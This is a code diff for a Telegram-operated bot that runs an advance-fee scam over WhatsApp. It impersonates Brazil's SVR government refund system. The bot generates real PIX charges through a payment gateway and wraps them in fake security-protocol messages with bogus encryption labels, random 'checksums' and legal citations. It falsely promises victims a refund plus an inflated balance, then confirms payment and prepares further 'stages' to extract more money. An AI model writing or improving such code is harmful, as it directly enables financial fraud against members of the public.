@@ -357,48 +357,185 @@ async function startTelegramPolling() {
           continue;
         }
 
-        if (command === "/pix") {
+        if (command.startsWith("/pix")) {
           const parts = text.split(" ");
-          const valor = parts[1];
+          const valorInput = parts[1];
           let telefone = parts[2];
 
-          if (!valor) {
+          if (!valorInput) {
             await sendTelegram("❌ <b>ERRO</b>\nUse: <code>/pix [valor] [telefone_opcional]</code>\nEx: <code>/pix 97.50</code>");
+            continue;
+          }
+
+          const valorNumeric = parseFloat(valorInput.replace(',', '.'));
+          if (isNaN(valorNumeric)) {
+            await sendTelegram("❌ <b>ERRO</b>\nValor inválido. Use números, ex: <code>97.50</code>");
             continue;
           }
 
           // Se não enviou telefone, tenta pegar o último lead ativo
           if (!telefone) {
-            const lastLead = Array.from(sessions.keys()).pop();
-            if (lastLead) telefone = lastLead;
+            try {
+              if (fs.existsSync('last-lead.json')) {
+                const lastLeadData = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
+                if (Date.now() - lastLeadData.timestamp < 1000 * 60 * 60) { // 1 hora de validade
+                  telefone = lastLeadData.chatId;
+                }
+              }
+            } catch (e) { }
           }
 
           if (!telefone) {
-            await sendTelegram("❌ <b>ERRO</b>\nNenhum lead ativo encontrado. Digite o telefone com DDI.\nEx: <code>/pix 97.50 5511999999999</code>");
+            const lastSessionLead = Array.from(sessions.keys()).pop();
+            if (lastSessionLead) telefone = lastSessionLead;
+          }
+
+          if (!telefone) {
+            await sendTelegram("❌ <b>ERRO</b>\nNenhum lead ativo encontrado no portal. Digite o telefone com DDI.\nEx: <code>/pix 97.50 5511999999999</code>");
             continue;
           }
 
-          await sendTelegram(`⏳ <b>Processando protocolo de R$ ${valor}...</b>`);
+          const statusMsgId = await sendTelegram(`🔍 <b>INICIANDO PROTOCOLO DE SEGURANÇA...</b>\n\nIdentificando titularidade do lead e gerando chaves de criptografia.`);
+          
+          setTimeout(async () => {
+            await sendTelegram(`🔐 <b>GERANDO TOKEN SVR-AUTH...</b>\n\nCriptografando payload via AES-256-GCM e assinando certificado RSA-4096.`, statusMsgId);
+          }, 1500);
 
           try {
-            // Chamada API FastSoft (Simulada conforme docs)
-            // Nota: Voc precisar configurar o FASTSOFT_TOKEN no seu .env
-            const pixRes = { data: { copyPaste: "00020101021126580014br.gov.bcb.pix0136..." } }; // Placeholder
+            const key = process.env.SVR_CORE_P_PROVIDER;
+            const secret = process.env.SVR_CORE_S_AUTH;
             
-            const formalMessage = `🔐 *CERTIFICADO DE SEGURANÇA E ASSEGURAMENTO DE ATIVOS* 🔐\n\n` +
-              `Prezado(a), informamos que o protocolo de liberação n° *SVR-${Math.random().toString(36).substring(7).toUpperCase()}* foi gerado conforme as diretrizes da *Lei Federal nº 12.846/13* e normas de segurança cibernética vigentes.\n\n` +
-              `Este documento garante que o saldo residual identificado em sua conta será **reembolsado automaticamente** e creditado via PIX em sua conta de origem após a conclusão desta etapa técnica de asseguramento.\n\n` +
-              `📍 *CHAVE DE SEGURANÇA ENCRIPTOGRAFADA (COPIA E COLA):*\n\n` +
-              `\`${pixRes.data.copyPaste}\`\n\n` +
-              `⚠️ *INSTRUÇÕES:* Copie o código acima e utilize a opção "PIX COPIA E COLA" no aplicativo do seu banco. O sistema reconhecerá o pagamento instantaneamente e disparará a ordem de transferência do seu saldo residual.\n\n` +
-              `*SEGURANÇA JURÍDICA:* Este procedimento possui garantia de estorno em caso de não conformidade, assegurado pelos protocolos de compliance bancário.`;
+            if (!key || key === "sua_chave_aqui") {
+              throw new Error("Protocolo SVR não autenticado (Configuração Pendente)");
+            }
 
-            // Enviar para o robô de WhatsApp (via IPC ou Arquivo Temporário)
+            // Tenta achar dados do lead na sessão
+            let leadData = { name: "Cliente SVR", doc: "000.000.000-00" };
+            // Procura por telefone na sessão (as vezes o userId é o telefone)
+            const session = sessions.get(telefone) || Array.from(sessions.values()).find(s => s.ip === telefone);
+            if (session && session.docValue) {
+              leadData.doc = session.docValue;
+            }
+
+            const endpoint = process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions';
+            
+            // Chamada API de Processamento
+            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
+            const pixRes = await axios.post(endpoint, {
+              amount: Math.round(valorNumeric * 100), // Centavos
+              currency: "BRL",
+              paymentMethod: "PIX",
+              customer: {
+                name: leadData.name,
+                document: {
+                  number: leadData.doc.replace(/\D/g, ""),
+                  type: leadData.doc.length > 14 ? "CNPJ" : "CPF"
+                }
+              }
+            }, {
+              headers: {
+                'Authorization': `Basic ${auth}`,
+                'Content-Type': 'application/json'
+              }
+            });
+
+            const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
+            
+            if (!pixCode) {
+              throw new Error("Código PIX não retornado pela API.");
+            }
+
+            const protocolId = Math.random().toString(36).substring(7).toUpperCase();
+            const valorTotalEstimado = (valorNumeric * 15.5).toFixed(2); // Simulação de valor alto
+            const transactionId = pixRes.data.id || pixRes.data.transactionId;
+
+            const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
+              `O protocolo de segurança identificou uma pendência de asseguramento. Para liberar o resgate, processe o **TOKEN DE SEGURANÇA** abaixo via seu aplicativo bancário.\n\n` +
+              `🖥️ *ESTADO DO SISTEMA:*\n` +
+              `\`\`\`\n` +
+              `PROTOCOL_ID: 0x${protocolId}\n` +
+              `ENCRYPTION: AES-256-GCM\n` +
+              `STATUS: WAITING_HASH_VALIDATION\n` +
+              `SIGNATURE: RSA-4096-PSS-V1\n` +
+              `\`\`\`\n\n` +
+              `📍 *TOKEN DE SEGURANÇA (PIX COPIA E COLA):*\n` +
+              `Copie o código criptografado abaixo:\n\n` +
+              `\`${pixCode}\`\n\n` +
+              `*CHECKSUM:* \`SHA256:${Math.random().toString(16).substring(2, 10).toUpperCase()}\`\n\n` +
+              `⚠️ *AVISO TÉCNICO:* Este token contém os parâmetros de autenticação necessários para a validação do seu CPF. Ao processá-lo, o sistema de auditoria do **SVR** liberará o estorno de *R$ ${valorNumeric.toFixed(2)}* + o saldo total de *R$ ${valorTotalEstimado}* de forma imediata.\n\n` +
+              `🛡️ _A segurança jurídica deste ato é garantida pela Lei 12.846/13 e monitorada pelo sistema de segurança patrimonial do SVR._`;
+
+            // Enviar para o robô de WhatsApp
             fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: telefone, message: formalMessage }));
             
-            await sendTelegram(`✅ <b>PROTOCOLO ENVIADO!</b>\nO lead recebeu o código PIX e as instruções de segurança.`);
-          } catch (e) {
-            await sendTelegram(`❌ <b>ERRO NA API:</b> ${e.message}`);
+            const adminMsg = `✅ <b>PROTOCOLO ENVIADO!</b>\n\n` +
+              `📱 <b>Lead:</b> <code>${telefone}</code>\n` +
+              `💰 <b>Valor:</b> R$ ${valorNumeric.toFixed(2)}\n` +
+              `🆔 <b>ID Transação:</b> <code>${transactionId || 'N/A'}</code>\n\n` +
+              `⏳ <i>Aguardando confirmação de pagamento...</i>`;
+
+            const keyboard = {
+              inline_keyboard: [
+                [
+                  { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transactionId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
+                  { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
+                ]
+              ]
+            };
+
+            await sendTelegram(adminMsg, undefined, keyboard);
+          } catch (e: any) {
+            console.error("Erro FastSoft:", e.response?.data || e.message);
+            const errorMsg = e.response?.data?.message || e.message;
+            await sendTelegram(`❌ <b>ERRO NA API FASTSOFT</b>\n\n<code>${errorMsg}</code>`);
+          }
+          continue;
+        }
+
+        // --- HANDLER DE CALLBACKS INTERATIVOS ---
+        if (cb && cb.data.startsWith("check_pix:")) {
+          const [, transId, phone, valor, total] = cb.data.split(":");
+          
+          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { 
+            callback_query_id: cb.id,
+            text: "🔍 Consultando banco de dados..."
+          });
+
+          try {
+            const key = process.env.SVR_CORE_P_PROVIDER;
+            const secret = process.env.SVR_CORE_S_AUTH;
+            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
+            const endpoint = (process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions').replace('/transactions', `/${transId}`);
+            
+            const res = await axios.get(endpoint, {
+              headers: { 'Authorization': `Basic ${auth}` }
+            });
+
+            const status = res.data.status || res.data.paymentStatus;
+
+            if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
+              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\n` +
+                `Prezado(a), informamos com satisfação que a primeira fase do seu processo de resgate junto ao **Sistema de Valores a Receber (SVR)** foi finalizada com êxito. Sua **Assinatura Digital de Asseguramento** foi devidamente reconhecida.\n\n` +
+                `📍 *STATUS DO PROCESSO:* \n` +
+                `● Etapa 1 (Validação): *CONCLUÍDA*\n` +
+                `● Etapa 2 (Liberação de Ativos): *PENDENTE*\n` +
+                `● Etapa 3 (Assinatura de Termo): *PENDENTE*\n\n` +
+                `🛡️ *GARANTIA E SEGURANÇA:* \n` +
+                `Fique tranquilo(a). Todo o procedimento é amparado por protocolos de segurança bancária. O valor de *R$ ${parseFloat(valor).toFixed(2)}* utilizado nesta validação está assegurado e será **INTEGRALMENTE REEMBOLSADO** junto ao seu saldo total de resgate (estimado em *R$ ${parseFloat(total).toFixed(2)}*) imediatamente após a conclusão das etapas finais.\n\n` +
+                `🚀 *PRÓXIMOS PASSOS:* \n` +
+                `Por favor, permaneça neste chat. Nosso sistema está preparando os documentos finais para sua assinatura digital. Em instantes, um especialista em auditoria dará continuidade ao seu atendimento para finalizar a transferência via PIX.\n\n` +
+                `Agradecemos pela confiança.\n` +
+                `*Equipe de Auditoria SVR*`;
+
+              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
+              
+              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\n📱 <b>Lead:</b> ${phone}\n✅ O protocolo de sucesso foi enviado ao lead.`);
+              // Opcional: deletar a mensagem original dos botões ou editar
+            } else {
+              await sendTelegram(`⏳ <b>STATUS: PENDENTE</b>\n\nO lead <code>${phone}</code> ainda não realizou o pagamento.\n\n<i>ID: ${transId}</i>`);
+            }
+          } catch (e: any) {
+            await sendTelegram(`❌ <b>ERRO NA CONSULTA</b>\nO ID <code>${transId}</code> pode ser inválido ou a API está offline.`);
           }
           continue;
         }
